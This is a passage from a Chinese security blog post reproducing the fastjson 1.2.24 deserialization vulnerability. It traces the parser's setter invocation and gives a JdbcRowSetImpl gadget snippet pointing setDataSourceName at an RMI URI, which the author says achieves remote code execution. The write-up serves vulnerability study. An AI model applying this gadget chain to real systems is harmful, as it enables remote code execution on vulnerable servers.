+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public void parseField(DefaultJSONParser parser, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues) &#123;</span><br><span class="line">    ...</span><br><span class="line">    Object value;</span><br><span class="line">    if (fieldValueDeserilizer instanceof JavaBeanDeserializer) &#123;</span><br><span class="line">        JavaBeanDeserializer javaBeanDeser = (JavaBeanDeserializer) fieldValueDeserilizer;</span><br><span class="line">        value = javaBeanDeser.deserialze(parser, fieldType, fieldInfo.name, fieldInfo.parserFeatures);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        ...</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);//获取值</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (parser.getResolveStatus() == DefaultJSONParser.NeedToResolve) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (object == null) &#123;</span><br><span class="line">            fieldValues.put(fieldInfo.name, value);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            setValue(object, value);//进入这里</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后进入setValue</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ublic void setValue(Object object, Object value) &#123;</span><br><span class="line">        if (value == null //</span><br><span class="line">            &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Method method = fieldInfo.method;</span><br><span class="line">            if (method != null) &#123;</span><br><span class="line">                if (fieldInfo.getOnly) &#123;</span><br><span class="line">                    ...</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    method.invoke(object, value);</span><br><span class="line">                &#125;</span><br><span class="line">                return;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new JSONException(&quot;set property error, &quot; + fieldInfo.name, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>进入对应字段的set或者get方法</p>
+<p>至此FastJson的洞已经分析完了，接下来就是如何利用这个任意set/get方法调用从而RCE了<br>因为以下payload能成功</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();<span class="comment">//只是为了方便调用</span></span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/aa&quot;</span>);<span class="comment">//可控uri</span></span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>且符合</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 方法名长度大于4且以set开头，且第四个字母要是大写</li>
+<li><input checked="" disabled="" type="checkbox"> 非静态方法</li>
+<li><input checked="" disabled="" type="checkbox"> 返回类型为void或当前类</li>
+<li><input checked="" disabled="" type="checkbox"> 参数个数为1个<br>这些条件<br>RCE达成</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://site.ccreater.top/2020/10/04/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" data-id="cku8k64al001pczon4dhyd8va" data-title="FastJson1.2.24调试记录_复现" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/10/14/Service%20Worker/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Service Worker
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/10/03/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2020 ciscn 华东南 web</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/10/01/4%E6%9C%88%E5%81%9A%E9%A2%98/">4月做题</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/01/%E6%88%91%E7%9A%842020/">我的2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/13/real%20world%20ctf%202020/">real world ctf 2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 ccreater<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
